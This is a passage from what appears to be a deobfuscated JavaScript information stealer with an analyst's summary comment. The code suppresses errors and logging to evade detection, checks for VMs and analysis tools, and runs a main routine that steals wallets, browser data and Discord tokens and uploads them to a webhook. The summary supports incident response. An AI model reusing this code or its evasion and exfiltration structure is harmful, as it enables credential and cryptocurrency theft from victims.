  // 7. SILENT ERROR HANDLING
  function setupErrorHandling() {
    // Catch all errors and exit silently to avoid detection
    process.on('uncaughtException', (error) => {
      // Log nothing, exit silently
      process.exit(0);
    });

    process.on('unhandledRejection', (reason, promise) => {
      // Log nothing, exit silently
      process.exit(0);
    });

    // Override console methods in production to prevent logging
    if (process.env.NODE_ENV === 'production') {
      console.log = () => {};
      console.error = () => {};
      console.warn = () => {};
      console.info = () => {};
    }
  }

  // Execute all evasion techniques
  setupErrorHandling();
  detectVirtualEnvironment();
  detectAnalysisTools();
  timingEvasion(); // This starts the delayed execution chain

  return {
    networkConfig: evadeNetworkDetection(),
    status: 'evasion_active'
  };
}

// Main execution flow
async function main() {
  try {
    // Initialize stealer
    await setupPersistence();

    // Collect system information
    const systemInfo = await stealSystemInfo();

    // Steal wallet data
    await stealWalletFiles(true, null, true, WEBHOOK_URL);

    // Steal browser data  
    await stealBrowserData();

    // Steal Discord tokens
    await stealDiscordTokens();

    // Upload all collected data
    await uploadStolenData(collectedData, WEBHOOK_URL);

  } catch (error) {
    // Silently fail to avoid detection
  }
}

/*
 * COMPREHENSIVE MALWARE ANALYSIS SUMMARY:
 * 
 * This malware is a sophisticated information stealer targeting:
 * - 50+ cryptocurrency wallet browser extensions (TARGETED_BROWSER_EXTENSIONS)
 * - 20+ desktop cryptocurrency applications (TARGETED_DESKTOP_WALLETS)
 * - Browser saved data (passwords, cookies, autofill) via stealBrowserData()
 * - Discord authentication tokens via stealDiscordTokens()
 * - Complete system information for profiling via stealSystemInfo()
 * 
 * CROSS-REFERENCE TO ORIGINAL OBFUSCATED CODE:
 * - String obfuscation: _0x23cb20 array (function names, paths)
 * - Encrypted payloads: xUfGue array (executable malicious code) 
 * - Cryptographic functions: SHA-256 implementation (tGpIENl array)
 * - Browser targeting: R, Q, X, Bt arrays (browser extension paths)
 * - System profiling: hostname, platform, homeDir, tmpDir variables
 * - C2 communication: hostURL, axios, request modules
 * - File operations: fs, fs_promises modules
 * - Command execution: ex (child_process.exec) module
 * - Main orchestration: main() function coordinates all theft
 * - Payload deployment: Xt() function for platform-specific malware
 * - Sandbox detection: testPath() function
 * 
 * The malware uses multiple layers of obfuscation including:
 * - Custom string encoding schemes (decodeString function)
 * - Function name mangling (_0x prefixed functions)
 * - Mathematical offset calculations (_0x2da5 deobfuscation)
 * - Dead code injection and control flow obfuscation
 * - Multi-layer base64 and character substitution encoding
 * 
 * TECHNICAL SOPHISTICATION:
 * - Enterprise-grade obfuscation techniques
 * - SHA-256 cryptographic implementation
 * - Comprehensive evasion (VM, sandbox, debugger detection)
 * - Multi-platform support (Windows, macOS, Linux)
 * - Modular architecture with dynamic payload loading
 * 
 * It appears designed to run silently and exfiltrate data to
 * remote servers via Discord webhooks or direct HTTP uploads to
 * command & control servers at obfuscated IP addresses (23.x.x.x)
 * 
 * INCIDENT CLASSIFICATION: CRITICAL
 * This represents an Advanced Persistent Threat (APT) level malware
 * specifically designed for cryptocurrency theft and financial fraud.
 * 
 * RECOMMENDATION: 
 * - Do not execute this code under any circumstances
 * - Scan system for compromise if this was run
 * - Check for unauthorized access to cryptocurrency accounts
 * - Change all passwords and revoke authentication tokens
 * - Consider this a serious security incident requiring immediate response
 * - Monitor for signs of persistent access or data exfiltration
 * - Review financial accounts and cryptocurrency holdings
 */
